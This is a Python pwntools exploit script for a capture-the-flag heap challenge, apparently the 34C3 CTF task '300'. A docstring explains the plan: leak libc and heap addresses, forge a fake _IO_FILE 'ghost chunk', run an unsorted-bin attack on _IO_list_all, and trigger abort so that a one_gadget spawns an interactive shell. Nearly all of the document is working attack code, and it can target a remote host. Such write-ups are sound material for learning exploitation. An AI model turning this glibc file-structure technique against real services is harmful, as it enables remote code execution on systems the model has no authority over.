#coding:utf-8
from pwn import *
import sys

'''
1. leak libc + heap
2. craft a "ghost chunk that serves 2 purposes:
    - fake _IO_FILE object
    - fake _IO_strfile object
2a. craft the "ghost chunk" s.t.
    - size is 0x61 (to later place it in smallbin[4])
    - contains a fake "BK" ptr that points to real unsorted_bin chunk
    - conditions to eventually reach: (((_IO_strfile *) fp)->_s._free_buffer) (fp->_wide_data->_IO_buf_base); are satisfied
        1) fp->_mode <= 0
        2) fp->_IO_write_ptr > fp->_IO_write_base
        3) fp->_wide_data->_IO_buf_base
        4) !(fp->_flags2 & _IO_FLAGS2_USER_WBUF)
        5) (((_IO_strfile *) fp)->_s._free_buffer) = one_shot
3. place the "ghost" chunk in unsorted bin
    - overwrite unsorted_bin->TAIL->BK w/ pGhostChunk
    - allocate unsorted_bin->TAIL out of unsorted_bin
4. place the "ghost" chunk into smallbin[4]
    - size of "ghost" chunk must be 0x61
    - "ghost" chunk size fails to satisfy malloc(0x300)
5. perform unsorted bin attack to overwrite IO_list_all w/ &main_arena.top
    - now, IO_list_all->_chain = ghostChunk
6. perform a double-free to trigger memory corruption error and start abort sequence
7. if ghostChunk is forged correctly, following steps are performed:
    - _IO_flush_all_lockp() is called to traverse + close all the FD's
    - _IO_list_all->_chain, which now points to ghostChunk, is checked to close it
    - ghostChunk->vtable, which now points to pIO_wstr_finish-0x18, is used in an attempt to call _IO_OVERFLOW()
    - instead of calling _IO_OVERFLOW(), _IO_wstr_finish(ghostChunk) is called
    - (((_IO_strfile *) fp)->_s._free_buffer), which now points to one_shot, is called :)
8. win!
'''

context.log_level = 'debug'

def alloc(slot):
    r.sendafter("4) free","1")
    r.sendafter("9)",str(slot))

def write(slot, data):
    r.sendafter("4) free","2")
    r.sendafter("9)",str(slot))
    r.send(data)

def printIt(slot):
    r.sendafter("4) free","3")
    r.sendafter("9)",str(slot))
    return r.recvuntil("1)")

def free(slot):
    r.sendafter("4) free","4")
    r.sendafter("9)",str(slot))

def exploit(r):
    ## LIBC + HEAP LEAK
    alloc(0)
    alloc(1)
    alloc(2) ## target unsorted chunk
    alloc(3)
    #gdb.attach(r)

    free(0)
    free(2)
    #write(2, "A")

    # remote
    libc_base = u64(printIt(0)[1:7].ljust(8,'\0'))-0x3c1b58
    heap_base = u64(printIt(2)[1:7].ljust(8,'\0'))-0x41
    stdin_buf_end = libc_base+0x3c1900
    stdout_buf_end = libc_base+0x3c2640
    dl_open_hook = libc_base+0x3c62e0

    stdout =libc_base+0x3c26e8
    stdin = libc_base+0x3c26f0
    IO_list_all = libc_base+0x3c2500
    p_IO_wstr_finish = libc_base+0x3bdc90 # PTR to _IO_wstr_finish
    
    one_shot = libc_base+0xcde41 

    p_top_chunk = libc_base+0x3c1b58

    ghost_chunk = heap_base+0x940+0x10 
    ghost_chunk_bk = heap_base+0x620 # fake BK ptr 

    log.success("libc_base at: "+hex(libc_base))
    log.success("heap_base at: "+hex(heap_base))
    log.success("_IO_list_all at: "+hex(IO_list_all))
    log.success("pIO_wstr_finish at: "+hex(p_IO_wstr_finish))
    log.success("one_shot at: "+hex(one_shot))

    ## CRAFT GHOST_CHUNK
    payload  = p64(0xb00bface)*2        
    payload += p64(0x0)            # start of fp/fake _IO_FILE_plus object
    payload += p64(0x61)
    payload += p64(0xb00bface)  
    payload += p64(ghost_chunk_bk) # needed so malloc can traverse unsorted_bin to get next victim chunk
    payload += p64(0x0)            # fp->_IO_write_base
    payload += p64(0xb00bface)     # fp->_IO_write_ptr 
    payload += p64(0xb00bface)     # fp->wide_data->buf_base
    payload += "A"*60
    payload += p64(0x0)            # fp->_flags2
    payload += "A"*36
    payload += p64(ghost_chunk)    # fp->_wide_data (need to cast this as: struct _IO_wide_data!)
    payload += "A"*24
    payload += p64(0x0)            # fp->_mode
    payload += "A"*16
    payload += p64(p_IO_wstr_finish-0x18) # fake vtable
    payload += "A"*8
    payload += p64(one_shot)       # ((_IO_strfile *) fp)->_s._free_buffer
    write(3, payload)
    log.success("ghostChunk crafted!")

    payload  = p64(0xb00bface)     
    payload += p64(ghost_chunk)    # unsorted_bin->TAIL->BK 
    write(0,payload)
  
    alloc(4) # put ghost_chunk in unsorted_bin->TAIL
    alloc(5) # put ghost_chunk in small_bins[4] 
    log.success("ghostChunk placed into small_bin[4]!")

    ## UNSORTED BIN ATTACK 
    alloc(6)
    free(5)

    payload  = p64(0xb00bface)
    payload += p64(IO_list_all-0x10) # target
    write(5,payload)
    alloc(7)
    log.success("unsorted bin attack succeeded!")
    
    ## TRIGGER ABORT SEQ
    log.info("triggering abort sequence...")
    print ""
    free(5)
    
    r.interactive()

if __name__ == "__main__":
    log.info("For remote: %s HOST PORT" % sys.argv[0])
    if len(sys.argv) > 1:
        r = remote(sys.argv[1], int(sys.argv[2]))
        exploit(r)
    else:
        #r = process(['/home/vagrant/CTFs/34c3ctf/300/300'], env={"LD_PRELOAD":"./libc.so.6"})
        r = process('./300')
        #r = process(['/home/vagrant/CTFs/34c3ctf/300/300'], env={"LD_PRELOAD":""})
        print util.proc.pidof(r)
        pause()
        exploit(r)
